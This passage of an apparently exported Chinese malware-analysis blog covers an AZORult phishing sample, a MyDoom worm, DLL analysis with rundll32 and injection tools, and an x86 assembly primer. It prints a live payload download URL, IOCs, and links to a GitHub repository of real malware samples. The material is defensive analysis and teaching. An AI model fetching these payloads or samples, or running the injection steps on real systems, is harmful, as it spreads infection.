FileType:RTF FileTypeExtension:rtf MIMEType:text/rtf Warning:Unspecified RTF encoding. Will assume Latin\n动态分析 当文件点击后台调用绑定splwow64.exe加载程序执行shellcode 并发起回链请求 回链请求如下所示： 回链请求地址为： http://evaglobal.eu/donstanz/donstanzo.exe 该样本目前已经无法访问，最近可用时间为12天前，但后面通过域名已经可以判断归属组织 稳定回链下载行为\n静态分析 4eb319d14fe441bb2604d4f92e646d1f258ebfc2 静态检测结果 HEUR:Exploit.MSOffice.Generic RTF/Obfuscation http://evaglobal.eu/donstanz/donstanzo.exe 与动态分析结果一致。\nIOCs: evaglobal.[eu]/donstanz/donstanzo.exe tfvn.com.[vn]/cytr/ja/QC87vPYWw7RCO6k.exe tfvn.com.[vn] evaglobal.[eu] 47.88.102.244\n对比IOCs:发现符合AZORult家族恶意软件系列回链地址，因此判断此次攻击为针对国内的邮件攻击服务。 样本地址： https://github.com/XTpeeps/MalwareSamples/tree/master/AZOrult%20exploit%20spyware\n",
    "description": "",
    "tags": "恶意样本分析,实例",
    "title": "样本分析-邮件恶意样本发现AZORult间谍软件传播",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-AZORult%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6%E5%80%9F%E5%8A%A9%E9%82%AE%E4%BB%B6%E5%9C%A8%E9%87%8E%E4%BC%A0%E6%92%AD/index.html"
  },
  {
    "content": "邮件恶意样本中发现新MYMOOD蠕虫传播地址 2019.08.19 流量监测发现附件中存在恶意样本,经判定属于MYMOOD蠕虫： 样本邮件 主题:Delivery reports about your e-mail 发件人:“Returned mail” \u003cMAILER-DAEMON@……\u003e 收件人:pany@…… 日期:Mon, 19 Aug 2019 05:51:20 +0800 \u003c为防止泄密和保护隐私，已对邮件内容进行屏蔽\u003e 附件1165539.scr\n样本信息 通过回溯该攻击者行为，可以发现其历史共进行攻击4次，涉及2个样本，8e1ca3dcdc1d470337dd735e0da71c81、7bad48ed8f8227deb13539379761d837。\n动态分析：其前台无痕迹，25端口发送大量恶意邮件。 在对样本7bad48ed8f8227deb13539379761d837（document.zip）的手动分析中发现其在执行之后会进行恶意伪造邮箱程序db6488afd97fb0f8ba0887c99c86b79e3173f9da1b4dbe39ebe3af0faea34a63（主程序document.bat）并传播恶意文件。\n通过还原发现其，向外发送形如下的邮件回传信息。\n可以看到样本执行后对外发送大量邮件传递信息，或恶意邮件传播。\n通过分析其邮件内容发现在对外发起的各类伪造邮件中发现大量进行对外蠕虫类攻击行为。\n不到半小时发邮件50多条，发送附件110多条。在对发件内容分析过程中发现，样本在执行之后会将受感染主机作为发件人，并通过布置邮件服务对外发起欺骗类恶意传播邮件和垃圾邮件。\n针对恶意样本的批量检测：\n传播样本：3cf49ce369ca677021efa21436db06a55ad39ae95c6aec20fd8ed8c95c0c8feb、\nfa1566a4335787ea408e33c21c7f2001ff91f3b71af57a26f4a5a64b10c856f6对样本的威胁情报分析可知其符合Mydoom恶意邮箱行为。\n根据MyDoom的另一个特点是试图通过TCP端口1042连接到其他IP地址验证样本存在其行为：\n根据行业前人总结mydoom是在2004年，mydoom今天仍然活跃。这些年来尽管基于恶意软件的电子邮件中有存在mydoom的比例并不高，仍然有许多基础设施受到感染。\n根据数据统计，mydoom感染的基础设施主要位于中国的IP地址，而美国则处于第二位。中国和美国都是mydoom电子邮件的主要针对国家。高科技是该病毒最针对的行业。\n这一蠕虫病毒曾被列为十大最具破坏性的计算机病毒，造成过百亿损失。虽然现在已经过了鼎盛时期，但该病毒对网络安全仍有很大威胁。虽然没有其他恶意软件家族显眼，但在过去的几年里，mydoom仍然活动频繁，约占所有带有恶意软件附件邮件的1.1%。我们每月记录近数万个mydoom样本。绝大多数mydoom电子邮件来自中国IP地址。这些电子邮件发送给世界各地的接收者，该病毒主要针对高科技、批发、零售、医疗、教育和制造业。\n相关文章：https://www.freebuf.com/articles/network/209777.html\nIOCs： Hash: 3cf49ce369ca677021efa21436db06a55ad39ae95c6aec20fd8ed8c95c0c8feb a92164c0c7c488c77631303dd51c9b94ca56ece027fc72231700d65ebada620a e4d18918d4867c28121489b3a5e17e1996981e2535e68042a07bb232c2ed5163 fa1566a4335787ea408e33c21c7f2001ff91f3b71af57a26f4a5a64b10c856f6 ip： 138.209.176.120 129.81.238.207 138.209.54.87\n样本地址 https://github.com/XTpeeps/MalwareSamples/tree/master/MYDOOM%20worm\n",
    "description": "",
    "tags": "恶意样本分析,实例",
    "title": "样本分析-邮件恶意样本中发现新MYMOOD蠕虫传播地址",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E9%82%AE%E4%BB%B6%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E4%B8%AD%E5%8F%91%E7%8E%B0%E6%96%B0MYMOOD%E8%A0%95%E8%99%AB%E4%BC%A0%E6%92%AD%E5%9C%B0%E5%9D%80/index.html"
  },
  {
    "content": " 当恶意代码打包进dll，需要对其进行一定量的定性分析，除了平台的手段，这里还有一些基础的dll分析手段。\n本系列主要内容来自《K A, Monnappa. Learning Malware Analysis: Explore the concepts, tools, and techniques to analyze and investigate Windows malware (pp. 95-96). Packt Publishing. Kindle 版本. 》的记录\nDLL分析 cff explorer tool\nIf you wish to know more about Dynamic-Link Libraries, read the following documents: https://support.microsoft.com/en-us/help/815065/what-is-a-dll and https://msdn.microsoft.com/en-us/library/windows/desktop/ms681914(v=vs.85).aspx.\n为什么攻击者使用dll dll不能双击运行，需要宿主进程执行。将恶意代码打包进dll，恶意程序作者能够使用任何进程加载他的dll，包括合法的进程例如explorer.exe、winlogon.exe等。这些技术可以帮助隐藏攻击者的行为，并且所有恶意行为将会隐藏在宿主程序下执行。 将dll注入到已经运行的程序将可以帮助攻击者长时间驻留在系统 当dll被一个程序加载进内存空间，dll还拥有整个程序内存的访问权限。从而给它操纵程序功能的能力。例如，攻击者可以注入dll到浏览器程序进程，偷取其重定向API函数的凭证。 使用rundll32.exe分析dll 使用动态分析对于判断恶意程序的行为至关重要。对于前面提到的dll需要一个程序进程运行。在windows中rundll32.exe能够被用来运行dll调用一个外部函数。\nrundll32.exe \u003cfull path to dll\u003e,\u003cexport function\u003e,optional arguments\u003e与rundll32.exe相关的参数： full path to dll：指定的dll地址，这个地址不能包含空或者特殊字符 export function:这个函数在dll中并且能够在dll加载之后调用 optional arguments:可选参数 逗号：用来表示dll中的某函数\n1. rundll32.exe工作原理 明白rundll32工作原理对于在执行dll时避免一些错误非常重要。当你运行rundll32.exe的时候使用命令行+参数形式执行，当执行rundll32.exe时发生的是:\n命令行参数通过rundll32.exe被首先执行；如果语法正确，则rundll32.exe执行 如果语法正确，执行加载提供的dll。作为加载dll的结果，dll切入口函数被执行（这在调用住dllmain）。大部分恶意程序实现他们的恶意代码通过dllmain函数。 在架在dll之后，获取外部函数及调用函数地址。如果函数地址不能被确认，则rundll32.exe中断。 如果可选参数提供，则可选函数将提供额外的扩展函数调用 rundll32详细信息工作原理详解: https://support.microsoft.com/en-in/help/164787/info-windows-rundll-and-rundll32-interface.\n2. 使用rundll32.exe运行dll几个场景 恶意样本时常调用dll运行，下面几个场景可以帮助识别dll的运行路径\n01.无函数输出的dll分析 当dll被调用，dllmain主函数作为入口函数被调用。攻击者在dllmain函数中直接实现键盘记录，信息窃取等操作，期间无任何函数输出。\n可能会遇到c:\\rundll32.exe c:\\samples\\aa.dll报错不执行可尝试c:\\rundll32.exe c:\\samples\\aa.dll,test尽管报错但可以执行\n02. 分析一个包含输出的dll 使用cff，可以看到出口函数表。\n可能会遇到C:\u003erundll32.exe c:\\samples\\obe.dll,test运行dll但是dll没有任何行为的时候考虑dll入口函数没有实现任何函数。如果使用c:\\rundll32.exe c:\\samples\\obe.dll,dllregisterserver直接调用可以触发cc回链请求，因此可以推断出这个函数实现网络连接功能。\n这里有一个相关fuzz恶意dll函数的工具可以用来方便检测： DLLRunner (https://github.com/Neo23x0/DLLRunner) DLLRunner是一个智能DLL执行脚本，用于沙盒系统中的恶意软件分析。 它不是通过“rundll32.exe file.dll”执行DLL文件，而是分析PE并按名称或序号执行所有导出的函数，以确定其中一个函数是否导致恶意活动。\n03. 分析带参数输出的dll 这里有个典型的案例，样本使用powerpoit加密尝试绕过安全检测分析：https://securingtomorrow.mcafee.com/mcafee-labs/threat-actors-use-encrypted-office-binary-format-evade-detection/ 一个dll（searchcache.dll）由出口函数，具有删除文件功能函数的_flushfile@16函数组成。这个出口函数能够接收一个参数，用来接收要删除的文件：（cff图） 测试其函数： rundll32.exe c:\\samples\\SearchCache.dll,_flushfile@16 C:\\samples\\file_to_delete.txt\nnoriben日志可以记录rundll32.exe删除操作。 Processes Created: [CreateProcess] cmd.exe:1100 \u003e “rundll32.exe c:\\samples\\SearchCache.dll,_flushfile@16 C:\\samples\\file_to_delete.txt” [Child PID: 3348] File Activity: [DeleteFile] rundll32.exe:3348 \u003e C:\\samples\\file_to_delete.txt\n3. 通过进程检查分析dll 大多数时候，使用rundll32.exe运行dll是没问题的，但是如果他们只运行在特定的程序下（explorer.exe或者iexplore.exe)等的DLL检查，当样本程序发现他运行在其他进程中他们的行为可能发生改变或者杀死自己的进程。在这种情况下，需要将dll注入到指定程序以触发其行为。\nRemoteDLL RemoteDll(http://securityxploded.com/remotedll.php) 允许DLL注入任何正在运行的进程。它允许使用3种不同的方式注入dll。\nTDSS Rootkit一个组件tdl.dll样本分析 这个样本不包含任何输出；所有的恶意代码都在dll的入口函数中实现。使用下面的命令执行会导致一个DLL初始化例程报错，说明程序没有正确执行： 通过静态分析代码，发现DLL入口函数包含一个确认检查（运行在spoolsv.exe下面）如果运行在其他程序下，dll就会初始化例程错误。 为了触发行为，恶意DLL必须注入到spoolsv.exe进程中。之后可以通过捕捉正常观察到程序操作。\n病毒分析过程中，可能会遇到一些dll只有当其作为服务时才会运行。这种DLL成为服务DLL。对于这种DLL的分析需要有windows API 相关知识基础。（后面会提到）\n基于基础动态分析有其局限，为了获取更深的洞察，需要代码分析（逆向分析） 例如，大多数样本使用c2服务加密通信。使用动态分析我们能够确定加密通信，但是无法获得其通信内容，因此我们需要了解如何进行代码分析。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析4-基础DLL分析",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-4-%E5%9F%BA%E7%A1%80DLL%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "汇编及反汇编入门 基于基础动态分析有其局限，为了获取更深的洞察，需要代码分析（逆向分析） 例如，大多数样本使用c2服务加密通信。使用动态分析我们能够确定加密通信，但是无法获得其通信内容，因此我们需要了解如何进行代码分析。\n动态和静态分析提供了了解恶意程序函数的好办法，单数不足以，提过所有关于恶意程序的信息。病毒坐着通常使用C或C++编写病毒程序，通过编译器编译。在你的调查过程中，你只有可执行的恶意程序，没有源代码。为了获得更深的关于恶意程序的内部工作和了解，代码分析是其至关重要的方面。\n这一块最好提前拥有C语言的基础，及汇编基础。这一块的相关资源可在继续之前学习： 计算机基础、内存及CPU 数据转换，结构及位运算 分支和循环 功能和堆栈 数组，字符和结构 64x架构框架 本系列主要内容来自《K A, Monnappa. Learning Malware Analysis: Explore the concepts, tools, and techniques to analyze and investigate Windows malware. Packt Publishing. Kindle 版本. 》的记录\n1. 计算机基础 计算机所有信息使用bits基本单位表示，1和0两种状态。bits的组合可以表示数字，字符以及任意信息。\n数据种类基础 1 bytes=8 bits 0.5 bytes=1 nibble(bits) 1 word=2 bytes dword=4 bytes=32 bits quadword(qword)= 8 bytes=64 bits\n数据解释 1 byte 或者 bytes 字节序列，能够被解释成不同的意思。 类似的2 bytes也可以被解释成不同的意思，汇编指令或者数字。 dword 也可以被解释成一串数或代表内存地址。如何被解释取决于如何使用它。\n1.1 内存 主内存（RAM）主要存储机器码以及计算机数据。RAM主要是一串字节（bytes）16进制字节序列，每个字节由地址标记。地址起始0终止于被使用量结尾。一个地址和值被16进制表示。\n1.1.1 数据如何驻留内存 在内存中，数据存储被存储在低优先级的格式中；一个低位存储在低地址，字节序列被递归存储在内存高地址中。 1.2 CPU CPU执行的指令通常称为机器指令，当需要取数据时从内存取数据。CPU包含一小块内存寄存器组。被用来存储在执行命令时从内存读取的数据。\n1.2.1 机器语言 每个CPU有一套它能够执行的指令集。CPU执行的指令是由机器语言组成。机器指令被存储在内存作为字节序列被CPU获取，解释，执行。\n编译器是一个用于将高级语言解释成机器语言的程序。\n1.3 程序基础 1.3.1 程序编译 程序编译过程：\nC/C++编写代码 编译器编译成机器码或object文件 连接器linker将目标代码与DLL文件生成系统可执行的程序 1.3.2 运行在磁盘的程序 通过PE internals tools - PeInternals打开编译过的可执行程序，显示出通过编译器生成的五部分（.text,.rdata,.data,.rsrc,.reloc）。如静态分析里提到的内容相同。这里主要关注.text和.data两部分。 例如程序中存在一串字符。这些字符存储在.data部分在文件偏移0x1E00位置。这个字符不属于代码部分，但是属于程序需要的数据。相同的方式.rdata部分是只读数据和有时包含的（import/export）数据。.rsrc部分包含被执行程序使用的资源。 .text部分字节序列（具体来说是35字节）是从0x400开始的机器码。机器码中包含了CPU将要执行的指令。编译器编译之后会在存储时分为data和code两部分。 为了简单起见在磁盘中的程序结构可以记为：可执行程序的组成部分就是code(.text)和data（data,.rdata等等)。\n1.3.3 在内存中的程序 当程序被加载到内存中时的情况。 过程： 双击应用程序之后，一个进程被操作系统分配到内存，并且可执行的被操作系统加载程序加载到分配的内存。下面的简化内存布局会帮助我们可视化概念；在磁盘中的结构和内存中的结构很相似。\n由图中可见，堆(heap)被用来在程序执行的时候动态分配内存，它的内容可以是变化的。堆被用来存储本地的变量，函数参数和返回的地址。内存还与链接库DLL有关。\n使用x64dbg调试器https://x64dbg.com/#start 加载可执行程序到内存0x13FC71000，并且所有的可执行部分都加载到内存中。这个地址是虚拟地址。虚拟地址最终将会被翻译成物理地址。\n检查.data部分开始记录的字符：一般会有\"This is a simple program.\"，而我测试的这个hackprocess没有： 监测.text部分的内存地址，显示部分字节的机器码： 一旦可执行部分包含的code和data被加载到内存，cpu从内存中获取机器码，解释并执行它。当执行机器指令时会从内存获取数据data。 当执行指令时，程序可与输入输出设备交互。例如：在程序执行的时候，字符串被打印在电脑屏幕上。同样也可以接收字符。\n总结，当程序执行时经历了下面几步：\n程序加载进内存 CPU获取机器指令，解释并执行 CPU从内存获取数据，数据可写入内存 CPU可与输入输出设备交互 1.3.4 程序反汇编（从机器码到汇编指令） 由于机器码极不方便阅读，因此反汇编调试工具（IDA或者x64dbg）可以用来转换机器码到汇编指令，这样可以方便阅读及分析程序的工作。\n2. CPU寄存器 CPU包含特殊的存储成为寄存器。 CPU访问寄存器里的数据比访问内存中的数据要快的多。因为内存中的数据要先拿到寄存器中再被CPU执行。\n2.1 通用寄存器 x86CPU有8个通用寄存器：eax,ebx,ecx,edx,esp,ebp,esi,edi。这些寄存器是32位（4字节）。程序可以获取寄存器32位，16位，8位值。每个寄存器的低16位（2字节）可以用ax,bx,cx,dx,sp,bp,si,di访问。eax.ebx,ecx,edx的低8位还可以通过al,bl,cl,dl引用。对应的高8位可以通过ah,bh,ch,dh访问。举例如下图所示： 2.2 指令指针（EIP） CPU存在一个特殊的寄存器eip；它包含下一个要执行的的指令的地址。当指令被执行，eip将会指向内存中下一个将被执行的指令地址。\n2.3 EFLAGS寄存器 eflags寄存器是32位寄存器，该寄存器的每一位都代表一个特殊含义的标记。eflags中的位使用来代表CPU运算中计算或控制的状态的。flag寄存器通常不直接引用，但是在执行计算或控制时，每一位会根据结果进行变化。\n除此之外还有一些额外的寄存器被称为段寄存器：cs,ss,ds,es,fs,gs，被用来在内存中保持追踪的。\n3. 数据转移指令MOV 通用的用法就是将src值移动到dst中：\nmov dst,src3.1 移动常数到寄存器 移动常数或者立即数到寄存器 not part of the assembly instruction. This is just a brief description to help you understand this concept: mov eax,10 ; moves 10 into EAX register, same as eax=10 mov bx,7 ; moves 7 in bx register, same as bx=7 mov eax,64h ; moves hex value 0x64 (i.e 100) into EAX\n3.2 移动值从一个寄存器到另一个 mov ebx,10 ; moves 10 into ebx, ebx = 10 mov eax,ebx ; moves value in ebx into eax, eax = ebx or eax = 103.3 移动值从内存到寄存器 int val=100 在程序执行时发生的情况：\n整数长度为4字节，因此整数100在内存中被存储为（00 00 00 64） 4字节序列被按照低位优先格式存放 整数100被存储在相同的内存地址下。 在汇编语言中，移动内存中的值到寄存器中，必须要使用值的地址。 方括号指定的时要保存的值在内存中的地址。\nmov eax,[0x403000] ; eax will now contain 00 00 00 64 (i.e 100)这里无需指定4字节，基于目标寄存器的大小，CPU会自动确认需要移动多少字节。 逆向过程中的其他类型还有如，方括号包含寄存器、常数+寄存器、寄存器+寄存器的形式。\nmov eax,[ebx] ; moves value at address specifed by ebx register mov eax,[ebx+ecx] ; moves value at address specified by ebx+ecx mov ebx,[ebp-4] ; moves value at address specified by ebp-4 另一个常见的指令lea指令 代表加载真实地址；这种指令会加载地址而不是值。将源地址传递给目的寄存器。 lea ebx,[0x403000] ; loads the address 0x403000 into ebx lea eax, [ebx] ; if ebx = 0x403000, then eax will also contain 0x403000 还可能会遇到 dword ptr 表明4字节（dword）值从ebp-4地址移动到eax： mov eax,dword ptr [ebp-4] ; same as mov eax,[ebp-4]3.4 移动值从寄存器到内存 你通过移动操作数可以移动一个值从一个寄存器到内存，内存地址在目标位置在左边，寄存器在右边。\nmov [0x403000],eax ; moves 4 byte value in eax to memory location starting at 0x403000 mov [ebx],eax ; moves 4 byte value in eax to the memory address specified by ebxdword ptr指定放入的格式4字节，word ptr指定2字节放入内存地址。\nmov dword ptr [402000],13498h ; moves dword value 0x13496 into the address 0x402000 mov dword ptr [ebx],100 ; moves dword value 100 into the address specified by ebx,也就是00 00 00 64 mov word ptr [ebx], 100 ; moves a word 100 into the address specified by ebx，也就是00 64 3.5 反汇编挑战 mov dword ptr [ebp-4],1 ➊;[ebp-4]=00 00 00 01 mov eax,dword ptr [ebp-4] ➋;eax=00 00 00 01 mov dword ptr [ebp-8],eax ;[ebp-8]=00 00 00 01,也就是把1给[ebp-8]3.6 反汇编解法 简单的方式理解反汇编代码，在对比c语言中，一个定义的变量实际上就是一个内存地址的象征名字。经过逻辑，然后可以定义内存地址给他们一个象征的名字。\n内存地址，直接给一个标记名字，如[ebp-4]=a,[ebp-8]=b\nsay, ebp-4 = a and ebp-8 = b. Now, the program should look like the one shown here: mov dword ptr [a],1 ; treat it as mov [a],1 mov eax,dword ptr [a] ; treat it as mov eax,[a] mov dword ptr [b],eax ; treat it as mov [b],eax在高级语言中你可以分配一个值给变量，val=1。在汇编中表示为mov [val],1\n相同逻辑高级编程语言替换\na = 1 eax = a b = eax ➍由于CPU使用寄存器暂存，因此还需要使用右边的标记值替换寄存器的名字，例如eax使用a替换\n寄存器使用右边的复制标记值替换\na = 1 eax = a b = a通过观察可以看到整个过程eax是作为暂时保存值使用的，因此，这里可以移除。\n移除多余的语句\na=1 a=b在高级语言中，变量都有数据类别。尝试定义这些变量的数据类别。有时定义这些数据类别需要通过他们访问和使用的值来确定。从汇编语言中可以看到dword 4字节表示的1（也就是00 00 00 01）被移动到a变量中，之后又赋值给了b。因此知道a，b的类型是4字节dword，因此他们可能是int，fload或者pointer。\n变量a，b不可能是fload，因为通过反汇编代码我们知道eax参与了数据操作的过程中。如果它是浮点值，那么标记寄存器一定会被使用，而不是使用通用寄存器eax。\n而a，b不可能是pointer指针的原因是，他们赋值为1，一个常数，而不是一个地址，因此最终确定是整数类型。\n确认变量的类型，结束\nint a; int b; a=1; b=a;对比原始c语言片段可以看到，并不是每次都可以反汇编出一模一样的代码，但是其语言的意思已经是无差别了。\nint a=1; int b; b=a;如果反汇编一个大程序，标记所有的内存地址可能会很困难。尤其是使用反汇编或者调试器去崇明名内存地址然后执行代码分析。\n当处理大程序的时候，好的做法是将程序拆分成程序块，然后分段反汇编，之后再用相同的方法去处理剩余的块。\n4. 算数运算 加减乘除。\n加减：add，sub。 这两个指令有两个操作数目的des和源src。都是用目的操作数加或者减源操作数，然后保存在目的操作数中，同时设置或者清除eflags寄存器的的标志位。 这些标记可以被用在条件语句。当sub执行之后等于0，zf标志位设置为0，并且如果目的操作数的值小于源操作数时，进位标志位cf，还应打标。 下面是几中命令变化：\nadd eax,42 ; same as eax = eax+42 add eax,ebx ; same as eax = eax+ebx add [ebx],42 ; adds 42 to the value in address specified by ebx,ebx的地址加42 sub eax, 64h ; subtracts hex value 0x64 from eax, same as eax = eax-0x64特殊的加(inc)减(dec)命令，可被用于寄存器或者内存地址的加一或者减一操作。\ninc eax ; same as eax = eax+1 dec ebx ; same as ebx = ebx-1 乘法：mul mul只有一个操作数，使用al，ax或者eax寄存器乘以操作数，结果保存在ax或者dx+ax或者edx+eax寄存器中。 如果mul的操作数是8位二进制（1字节），则它使用8位al寄存器做乘法，然后结果存储在ax寄存器中。如果操作数使用的是16位二进制（2字节），则它使用16位ax寄存器做乘法，结果保存在dx和ax寄存器中。如果操作数是32位二进制（4字节），则它使用eax寄存器做乘法，结果保存在edx和eax寄存器中。结果保存在2倍大小的寄存器中是因为两个值相乘的结果将可能比输入大很多。 mul ebx ;ebx is multiplied with eax and result is stored in EDX and EAX mul bx ;bx is multiplied with ax and the result is stored in DX and AX 除法：div div也只有一个操作数，并且可以是寄存器也可以是内存引用。在执行除法过程中，需要把被除数放在edx和eax寄存器中，edx可以保存大部分重要的dword（32位4字节）。被除数放在eax中，除数放在ebx中对应位置，在div指令执行之后，商被保存在eax，余数保存在edx寄存器中。 div ebx ; divides the value in EDX:EAX by EBX。EAX/EBX=EDX（余数）:EAX（商）4.1 反汇编挑战 mov dword ptr [ebp-4], 16h mov dword ptr [ebp-8], 5 mov eax, [ebp-4] add eax, [ebp-8] mov [ebp-0Ch], eax mov ecx, [ebp-4] sub ecx, [ebp-8] mov [ebp-10h], ecx练习： a=16h [ebp-8]=5 eax=16h eax=16h+5h=1Bh [ebp-0Ch]=1Bh ecx=16h ecx=16h-5h=11h [ebp-10h]=11h\nint a=16h int b=5 int c,d c=a+b=1Bh d=a-b=11h\nint a,b,c,d a=22; b=5; c=a+b=27; d=a-b=17;\n答案原C语言代码：\nint num1 = 22; int num2 = 5; int diff; int sum; sum = num1 + num2; diff = num1 - num2;5. 按位操作 按位从最右侧开始编号，最右边（最低有效位）是0位的位置，从右向左按位提高。最左边位为最高有效位。如下所示： 位操作不是指令；只有一个操作数（作为源和目的）和颠倒所有位。如果eax包含FF FF 00 00 (11111111 11111111 00000000 00000000),则下面的指令将会反转所以为。并存储在eax寄存器中。\nnot eax and，or，xor指令执行对应位操作并且保存在目的地址中。 cl和bl进行and操作执行，将会按位相与，得出结果保存在bl中。 and bl,cl; bl=bl\u0026cl or eax,ebx ; same as eax = eax | ebx xor eax,eax ; same eax = eax^eax, this operation clears the eax register 逻辑shr(右移) 和shl(左移) 指令 有两个操作数（目的和记数）。目的操作数可以是寄存器也可以是内存关联地址。这些指令与c或者python中的shift left （«）或者shift right（»）很像。 shl dst,count逻辑位移指令，顺序左移或者右移，最高位移到cf中，最低位0补充。\n特殊的：xor eax,eax 常用于清除eax的值 关于位操作的引申阅读： https://en.wikipedia.org/wiki/Bitwise_operations_in_C https://www.programiz.com/c-programming/bitwise-operators.\nrol(循环左移) 和ror(循环右移) 与shift执行相似，只是移出的位添加到另一边。例如左边移出的位添加到右边。 6. 分支和条件 if/else和 jump jump有两种：有条件和无条件\n6.1 无条件跳转 无条件跳转常用到jump。机器码jmp。这与C中的goto类似。下面的质量将控制跳转到jump address（跳转地址）并从此处开始执行：\njmp \u003cjump address\u003e6.2 有条件跳转 在控制跳转时，控制转入一个内存地址需要基于一些条件。你需要执行变更标志（重置或则清除）。这些指令可以执行算数运算或者位运算。在x86指令提供cmp指令，从第一个操作数（目的操作数）减第二个操作数（源操作数）将结果保存在目的操作数中，同时修改标志位。在接下来的指令中，如果eax为5，cmp eax,5 则eax-5=0 将会设置flag(zf位为1)：\ncmp eax,5 ;# eax-5设置flags但是结果不保存另一个指令改变标志位flags但是不保存结果：test指令。test指令执行1比特操作and同时改变标志位并不存储结果。\ntest eax,eax;cmp,test指令都带有jump指令判定，可以跳转。 几种jump指令变种：\njcc \u003caddress\u003e ;cc为条件格式，条件基于在eflags寄存器中比特位。下面是不同类型跳转条件及别名以及标志位使用表：\n指令 描述 别名 标志位使用 jz jump if zero je zf=1 jnz jump if not zero jne zf=0 jl jump if less jnge sf=1 jle jump if less of equal jnle zf=1 or sf=1 jg jump if greater jnle zf=0 and sf=0 jge jump if greater or equal jnl sf=0 jc jump if carry (如果有进位) jb,jnae cf=1 jnc jump if not carry（如果不进位） jnb,jae 6.3 if语句 从逆向的角度，识别分支和条件声明是很重要的。为了做到识别有必要了解清楚再汇编语句中如何实现分支和条件声明（如if,if-else,if-else if-else）的汇编语言。\nif (x==0){ x=5; } x=2;==对应not equal to (jne)\ncmp dword ptr[x],0 jne end_if mov dword ptr[x],5 end_if: mov doword ptr[x],2 6.4 if-else语句 if(x==0){ x=5; } else{ x=1; }cmp dword ptr[x],0 jne else mov dword ptr[x],5 jmp end else: mov dowrd ptr[x],1 end:6.5 ifleseif-else 语句 if(x==0){ x=5; } else if(x==1){ x=6; } else{ x=7; }cmp dword ptr[ebp-4],0 jnz else_if mov dword ptr[ebp-4],5 jmp short end # 段内短转移，修改范围：-128~127，\"short\"说明进行短转移。 else_if: cmp dword ptr[ebp-4],1 jnz else mov dword ptr[ebp-4],6 jmp short end else: mov dword ptr[ebp-4],7 end:6.6 反汇编练习 mov dword ptr [ebp-4], 1 cmp dword ptr [ebp-4], 0 jnz loc_40101C mov eax, [ebp-4] xor eax, 2 mov [ebp-4], eax jmp loc_401025 loc_40101C: mov ecx, [ebp-4] xor ecx, 3 mov [ebp-4], ecx loc_401025:x=1 if (x==0) { x=x^2; } else{ x=x^3; }7. 循环 最常见的两个循环for和while。\n/*for 循环*/ for(初始值;条件;更新语句){ 代码块 } /*while 循环*/ 初始化 while(条件){ 代码块 }示例：\nint i=0 while(i\u003c5){ i++; }mov [i],0 while_start: cmp [i], 5 jge end mov eax, [i] add eax, 1 mov [i], eax jmp while_start end:7.1 反汇编挑战 mov dword ptr [ebp-8], 1 mov dword ptr [ebp-4], 0 loc_401014: cmp dword ptr [ebp-4], 4 jge short loc_40102E mov eax, [ebp-8] add eax, [ebp-4] mov [ebp-8], eax mov ecx, [ebp-4] add ecx, 1 mov [ebp-4], ecx jmp short loc_401014 loc_40102E:int x=1; int y=0; while(y\u003c4){ x=x+y; y++; }8. 函数 参数，局部变量和函数控制流都保存在内存的栈中。\n8.1 栈 栈是当操作系统线程创建的时候由操作系统制定分配的内存中的一块区域。栈后进先出（LIFO，Last-In-First-Out）。通过push,pop，来对栈进行压栈和弹栈操作，分别对应压入4byte和从栈顶弹4byte值操作。\npush source; 将源(source)压入栈顶 pop destination; 将栈顶值弹出到目的地址（destination）栈从从高地址向低地址增长。当一个栈被创建，esp寄存器（也被称为栈指针）指向栈顶（逻辑上的高位，但从地址来看是指向栈里值中最低地址那位），当执行push操作将数据压入栈中，esp寄存器则指向比压入数据更低位的（esp-4）地址。当执行pop后，esp则加4（esp+4）。\n举例：\n/*假设esp 初始指向0xff8c*/ push 3 //esp-4 push 4 //esp-8 pop ebx //esp-\u003e esp-4 pop edxebx=4 ,edx=3, esp最后指向初始位置\n8.2 调用函数 call 函数名汇编在调用函数之前将下一需要执行指令地址保存在栈中。并在函数调用结束之后从栈中弹出地址继续执行。\n8.3 函数返回 汇编中函数返回使用ret命令，该命令执行pops将弹出栈顶的地址，取出的值放在eip寄存器。\nret8.4 函数参数和返回值 在x86架构中函数的参数被压在栈中，返回值在eax寄存器中被替代。\nint test(int a, int b) { int x, y; x = a; y = b; return 0; } int main() { test(2, 3); return 0; }main: push 3 push 2 call test add esp, 8 ; after test is exectued, the control is returned here xor eax, eax test: push ebp //栈顶指针，指向本函数在栈的栈顶,用于函数执行完返回函数入口地址继续执行，执行之后esp会自动减4，压栈使用 mov ebp,esp //ebp/esp同时指向栈顶，ebp用作固定位置，应用使用ebp关联函数参数和局部变量 sub esp,8 //为x,y分配空间 //---实际上函数代码---- mov eax,[ebp+8] mov [ebp-4],eax mov ecx,[ebp+0Ch] mov [ebp-8],ecx //------- xor eax,eax //eax清0，return 0，返回值通常保存在eax //---还原函数环境--- mov esp,ebp pop ebp //------- retpush ebp和mov ebp,esp经常出现在函数的开始，可以被称作函数的序或者函数的开始。是函数用来初始化函数使用的。 mov esp,ebp和pop ebp执行函数的序逆向操作。成为函数尾声，在函数执行之后恢复环境。 ebp在这里被设置为固定位置，函数的参数可以通过ebp+正向偏移量进行标定。局部变量可以通过ebp-偏移量进行标定。举例上面test(2,3)，函数参数2，被存储在ebp+8（a）位置，第二个参数被存储在ebp+0xc（b），局部变量分别放在ebp-4（x），ebp-8（y）。\n大部分编译器（如Microsoft Visual C/C+ 